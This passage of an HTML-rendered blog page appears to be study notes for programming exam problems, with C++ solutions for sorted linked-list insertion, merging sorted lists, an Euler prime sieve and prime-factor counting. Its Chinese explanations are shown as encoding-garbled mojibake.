class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> Element; <span class="comment">// èŠ‚ç‚¹ä¸­çš„å…ƒç´ ä¸ºæ•´æ•°ç±»å‹</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">Next</span>;</span> <span class="comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä»é”®ç›˜è¾“å…¥5ä¸ªæ•´æ•°ï¼Œå°†è¿™äº›æ•´æ•°æ’å…¥åˆ°ä¸€ä¸ªé“¾è¡¨ä¸­ï¼Œå¹¶æŒ‰ä»å°åˆ°å¤§æ¬¡åºæ’åˆ—ï¼Œæœ€åè¾“å‡ºè¿™äº›æ•´æ•°ã€‚</p><p>ç›´æ¥æ’å…¥ï¼Œè¾¹æ’å…¥è¾¹æ¯”è¾ƒå°±è¡Œäº†</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> Element; <span class="comment">// èŠ‚ç‚¹ä¸­çš„å…ƒç´ ä¸ºæ•´æ•°ç±»å‹</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">Next</span>;</span> <span class="comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">head</span> =</span> (struct Node*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(Node));</span><br><span class="line">head-&gt;Next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">p = head;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">tmp</span> =</span> (struct Node*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(Node));</span><br><span class="line">cin &gt;&gt; tmp-&gt;Element;</span><br><span class="line"><span class="keyword">while</span>(p-&gt;Next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(tmp-&gt;Element &lt; p-&gt;Next-&gt;Element)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">p = p-&gt;Next;</span><br><span class="line">&#125;</span><br><span class="line">tmp-&gt;Next = p-&gt;Next;</span><br><span class="line">p-&gt;Next = tmp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">head = head-&gt;Next;</span><br><span class="line"><span class="keyword">while</span>(head != <span class="literal">NULL</span>)&#123;</span><br><span class="line">cout &lt;&lt; head-&gt;Element &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">head = head-&gt;Next;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é“¾è¡¨åˆå¹¶"><a href="#é“¾è¡¨åˆå¹¶" class="headerlink" title="é“¾è¡¨åˆå¹¶"></a>é“¾è¡¨åˆå¹¶</h2><h5 id="é¢˜ç›®æè¿°-6"><a href="#é¢˜ç›®æè¿°-6" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>ç»™å®šä¸¤ä¸ªå…ƒç´ æœ‰åºï¼ˆä»å°åˆ°å¤§ï¼‰çš„é“¾è¡¨ï¼Œè¦æ±‚å°†ä¸¤ä¸ªé“¾è¡¨åˆå¹¶æˆä¸€ä¸ªæœ‰åºï¼ˆä»å°åˆ°å¤§ï¼‰é“¾è¡¨ï¼Œ</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-4"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-4" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-6"><a href="#è¾“å…¥æè¿°-6" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€è¡Œè¾“å…¥ç¬¬ä¸€ä¸ªé“¾è¡¨çš„ç»“ç‚¹æ•°<span class="built_in">S1</span>ï¼Œ<span class="built_in">S1</span>&lt;<span class="number">=100</span>ã€‚</span><br><span class="line">ç¬¬äºŒè¡Œè¾“å…¥<span class="built_in">S1</span>ä¸ªæ•´æ•°ï¼Œä¸¤ä¸¤ä¹‹é—´ç”¨ç©ºæ ¼éš”å¼€ã€‚</span><br><span class="line">ç¬¬ä¸‰è¡Œè¾“å…¥ç¬¬äºŒä¸ªé“¾è¡¨çš„ç»“ç‚¹æ•°<span class="built_in">S2</span>ï¼Œ<span class="built_in">S2</span>&lt;<span class="number">=100</span>ã€‚</span><br><span class="line">ç¬¬å››è¡Œè¾“å…¥<span class="built_in">S2</span>ä¸ªæ•´æ•°ï¼Œä¸¤ä¸¤ä¹‹é—´ç”¨ç©ºæ ¼éš”å¼€ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-6"><a href="#è¾“å‡ºæè¿°-6" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡ºåˆå¹¶ä¹‹åçš„é“¾è¡¨ç»“æœï¼Œä¸¤ä¸¤ä¹‹é—´ç”¨ç©ºæ ¼éš”å¼€ï¼Œæœ«å°¾æ²¡æœ‰ç©ºæ ¼ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> element; <span class="comment">// èŠ‚ç‚¹ä¸­çš„å…ƒç´ ä¸ºæ•´æ•°ç±»å‹</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> * <span class="title">next</span>;</span> <span class="comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">struct node *<span class="title">setup</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">head</span>, *<span class="title">p</span>;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">tmp</span> =</span> <span class="keyword">new</span> node;</span><br><span class="line">cin &gt;&gt; tmp-&gt;element;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">head = tmp;</span><br><span class="line">p = head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;next = tmp;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(struct node *head1, struct node *head2)</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">head</span>, *<span class="title">p</span>;</span></span><br><span class="line"><span class="keyword">if</span>(head1-&gt;element &lt; head2-&gt;element)&#123;</span><br><span class="line">head = head1;</span><br><span class="line">head1 = head1-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">head = head2;</span><br><span class="line">head2 = head2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">p = head;</span><br><span class="line"><span class="keyword">while</span>(head1 != <span class="literal">NULL</span> &amp;&amp; head2 != <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(head1-&gt;element &lt; head2-&gt;element)&#123;</span><br><span class="line">p-&gt;next = head1;</span><br><span class="line">head1 = head1-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">p-&gt;next = head2;</span><br><span class="line">head2 = head2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(head1 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">p-&gt;next = head1;</span><br><span class="line">head1 = head1-&gt;next;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(head2 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">p-&gt;next = head2;</span><br><span class="line">head2 = head2-&gt;next;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p = head;</span><br><span class="line"><span class="keyword">while</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">cout &lt;&lt; p-&gt;element &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">head1</span>, *<span class="title">head2</span>;</span></span><br><span class="line">head1 = <span class="built_in">setup</span>(n);</span><br><span class="line">cin &gt;&gt; m;</span><br><span class="line">head2 = <span class="built_in">setup</span>(m);</span><br><span class="line"><span class="built_in">merge</span>(head1, head2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ•°å­¦"><a href="#æ•°å­¦" class="headerlink" title="æ•°å­¦"></a>æ•°å­¦</h1><p>è®°ä½ä¸€äº›å¸¸è§çš„ï¼Œgcdï¼Œlcmï¼Œ æ–æ³¢é‚£å¥‘æ•°åˆ—</p><h2 id="ç´ æ•°"><a href="#ç´ æ•°" class="headerlink" title="ç´ æ•°"></a>ç´ æ•°</h2><p>è®°å½•ä¸€ä¸‹æ¬§æ‹‰ç­›ï¼Œç”¨åˆ°äº†vectorç»“æ„ï¼Œå¹¶ä¸”è¿›è¡Œå‡½æ•°ä¼ å‚ï¼›</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">c++</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN = <span class="number">1020</span>;</span><br><span class="line"><span class="keyword">bool</span> isnp[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> n, vector&lt;<span class="keyword">int</span>&gt; &amp;primes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isnp[i])</span><br><span class="line">            primes.<span class="built_in">push_back</span>(i);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        <span class="keyword">int</span> p = primes[j];</span><br><span class="line">            <span class="keyword">if</span> (p * i &gt; n)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            isnp[p * i] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (i % p == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a, b;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line"><span class="keyword">if</span>(a &gt; b)&#123;</span><br><span class="line"><span class="keyword">int</span> tmp = a;</span><br><span class="line">a = b;</span><br><span class="line">b = tmp;</span><br><span class="line">&#125;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; primes;</span><br><span class="line"><span class="built_in">init</span>(b, primes);</span><br><span class="line"><span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        <span class="keyword">int</span> p = primes[j];</span><br><span class="line"><span class="keyword">if</span>(p &gt;= a &amp;&amp; p &lt;= b)&#123;</span><br><span class="line">cnt++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è´¨å› æ•°ä¸ªæ•°"><a href="#è´¨å› æ•°ä¸ªæ•°" class="headerlink" title="è´¨å› æ•°ä¸ªæ•°"></a>è´¨å› æ•°ä¸ªæ•°</h3><h5 id="é¢˜ç›®æè¿°-7"><a href="#é¢˜ç›®æè¿°-7" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>æ±‚æ­£æ•´æ•°N(N&gt;1)çš„è´¨å› æ•°çš„ä¸ªæ•°ã€‚ ç›¸åŒçš„è´¨å› æ•°éœ€è¦é‡å¤è®¡ç®—ã€‚å¦‚120=22235ï¼Œå…±æœ‰5ä¸ªè´¨å› æ•°ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-5"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-5" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-7"><a href="#è¾“å…¥æè¿°-7" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯èƒ½æœ‰å¤šç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„æµ‹è¯•æ•°æ®çš„è¾“å…¥æ˜¯ä¸€ä¸ªæ­£æ•´æ•°<span class="built_in">N</span>ï¼Œ(<span class="number">1</span>&lt;<span class="built_in">N</span>&lt;<span class="number">10</span>^<span class="number">9</span>)ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-7"><a href="#è¾“å‡ºæè¿°-7" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹äºæ¯ç»„æ•°æ®ï¼Œè¾“å‡º<span class="built_in">N</span>çš„è´¨å› æ•°çš„ä¸ªæ•°ã€‚</span><br></pre></td></tr></table></figure><p>è™½ç„¶è¾“å…¥èŒƒå›´æ˜¯1e9ï¼Œä½†æ˜¯å®é™…ä¸Šè¦æ±‚å‡ºæ¥çš„ç´ æ•°èŒƒå›´ä¸åˆ°1e5ï¼Œè¿˜æ˜¯å¯ä»¥ç”¨æ¬§æ‹‰ç­›çš„ï¼Œä¹‹åç”¨ç´ æ•°è¡¨ä¸€ä¸ªä¸ªè¯•ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN = <span class="number">10000000</span>;</span><br><span class="line"><span class="keyword">bool</span> isnp[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> n, vector&lt;<span class="keyword">int</span>&gt; &amp;primes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isnp[i])</span><br><span class="line">            primes.<span class="built_in">push_back</span>(i);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        <span class="keyword">int</span> p = primes[j];</span><br><span class="line">            <span class="keyword">if</span> (p * i &gt; n)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            isnp[p * i] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (i % p == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n &lt; <span class="number">4</span>)&#123;</span><br><span class="line">cout &lt;&lt; <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; primes;</span><br><span class="line"><span class="keyword">int</span> m = <span class="built_in">sqrt</span>(n);</span><br><span class="line"><span class="built_in">init</span>(m, primes);</span><br><span class="line"><span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; primes.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line"><span class="keyword">while</span>(n % primes[i] == <span class="number">0</span>)&#123;</span><br><span class="line">n /= primes[i];</span><br><span class="line">cnt++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(n &gt; <span class="number">1</span>) cnt++;</span><br><span class="line">cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æœ€å¤§ç´ å› å­"><a href="#æœ€å¤§ç´ å› å­" class="headerlink" title="æœ€å¤§ç´ å› å­"></a>æœ€å¤§ç´ å› å­</h3><h5 id="é¢˜ç›®æè¿°-8"><a href="#é¢˜ç›®æè¿°-8" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>å¯¹äºç»™å®šçš„å­—ç¬¦åºåˆ—ï¼Œä»å·¦è‡³å³å°†æ‰€æœ‰çš„æ•°å­—å­—ç¬¦å–å‡ºæ‹¼æ¥æˆä¸€ä¸ªæ— ç¬¦å·æ•´æ•°ï¼ˆå­—ç¬¦åºåˆ—é•¿åº¦å°äº100ï¼Œæ‹¼æ¥å‡ºçš„æ•´æ•°å°äº2^31,ï¼‰ï¼Œè®¡ç®—å¹¶è¾“å‡ºè¯¥æ•´æ•°çš„æœ€å¤§ç´ å› å­ï¼ˆå¦‚æœæ˜¯ç´ æ•°ï¼Œåˆ™å…¶æœ€å¤§å› å­ä¸ºè‡ªèº«ï¼‰</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-6"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-6" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-8"><a href="#è¾“å…¥æè¿°-8" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ‰å¤šç»„æ•°æ®ï¼Œè¾“å…¥æ•°æ®çš„ç¬¬ä¸€è¡Œä¸ºä¸€ä¸ªæ­£æ•´æ•°ï¼Œè¡¨ç¤ºå­—ç¬¦åºåˆ—çš„æ•°ç›®ï¼Œæ¯ç»„æ•°æ®ä¸ºä¸€è¡Œå­—ç¬¦åºåˆ—ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-8"><a href="#è¾“å‡ºæè¿°-8" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹æ¯ä¸ªå­—ç¬¦åºåˆ—ï¼Œå–å‡ºæ‰€å¾—æ•´æ•°çš„æœ€å¤§ç´ å› å­ï¼Œè‹¥å­—ç¬¦åºåˆ—ä¸­æ²¡æœ‰æ•°å­—æˆ–è€…æ‰¾å‡ºçš„æ•´æ•°ä¸º0ï¼Œåˆ™è¾“å‡º0ï¼Œæ¯ä¸ªæ•´æ•°å ä¸€è¡Œè¾“å‡ºã€‚</span><br></pre></td></tr></table></figure><p>å…ˆå¤„ç†å­—ç¬¦ä¸²è·å¾—æ•°å­—nï¼Œå†å¾—åˆ°&amp;&amp;\sqrt(n)&amp;&amp;ä»¥å†…çš„ç´ æ•°ï¼Œç„¶åéå†ä¸€éå¾—åˆ°æœ€å¤§ç´ æ•°ï¼›</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 